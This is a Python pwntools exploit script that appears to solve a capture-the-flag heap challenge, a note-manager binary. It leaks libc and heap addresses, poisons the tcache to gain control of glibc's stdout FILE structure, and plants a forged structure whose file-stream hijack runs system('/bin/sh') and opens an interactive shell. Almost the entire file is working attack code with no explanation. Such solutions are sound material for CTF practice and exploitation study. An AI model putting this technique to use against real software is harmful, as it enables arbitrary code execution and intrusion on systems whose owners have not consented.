#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('prob')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create_note(idx, size, name, content, shell=False):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", str(idx).encode())
    io.sendlineafter(b">", str(size).encode())
    io.sendafter(b">", name)
    if not shell:
        io.sendafter(b">", content)

def delete_note(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", str(idx).encode())

def edit_note(idx, name, content):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b">", str(idx).encode())
    io.sendafter(b">", name)
    io.sendafter(b">", content)

def print_note(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(idx).encode())
    io.recvuntil(b": ")
    leak = io.recvline().split()[0]
    arena = u64(leak.ljust(8, b"\x00"))
    io.recvuntil(b": ")
    leak = io.recv(5)
    heap = u64(leak.ljust(8, b"\x00"))
    return arena, heap

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val


def solve():

    """
    Info leaks!
    """

    create_note(0, 0x500, b"A", b"B")
    create_note(1, 0x10, b"A", b"B")
    delete_note(0)
    delete_note(0)

    main_arena, heap_leak = print_note(0)
    heap_base = heap_leak << 12
    main_arena -= 96
    libc.address = main_arena - libc.sym["main_arena"]
    info("libc base: %#x", libc.address)
    info("heap base: %#x", heap_base)


    """
    Heap feng shui -> Tcache Poisoning
    """

    create_note(2, 0xe0, b"hehe1", b"haha1")
    create_note(3, 0xe0, b"hehe2", b"haha2")

    delete_note(2)
    delete_note(3)

    create_note(4, 0x20, b"hehe3", b"haha3") 
    delete_note(2)
    delete_note(3)

    stdout = libc.sym["_IO_2_1_stdout_"] 
    ptr = mangle(heap_base, stdout)

    edit_note(2, b"A"*9, b"B"*9)
    delete_note(2)
    edit_note(2, b"A"*8, b"B"*8)
    delete_note(2)
    edit_note(2, b"junk", p64(ptr))

    """
    FSOP on stdout
    """

    stdout_lock = libc.sym["_IO_stdfile_1_lock"]
    stdout = libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18
    gadget = libc.address + 0x1636a0 # add rdi, 0x10 ; jmp rcx

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end = libc.sym['system']
    fake._IO_save_base = gadget
    fake._IO_write_end = u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock = stdout_lock
    fake._codecvt = stdout + 0xb8
    fake._wide_data = stdout + 0x200          # _wide_data just need to points to empty zone
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    create_note(5, 0x100, bytes(fake), b"lol", shell=True)
    # io.sendlineafter(b">", b"1")
    # io.sendlineafter(b">", str(10).encode())
    # io.sendlineafter(b">", str(0x100).encode())
    # io.sendafter(b">", bytes(fake))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

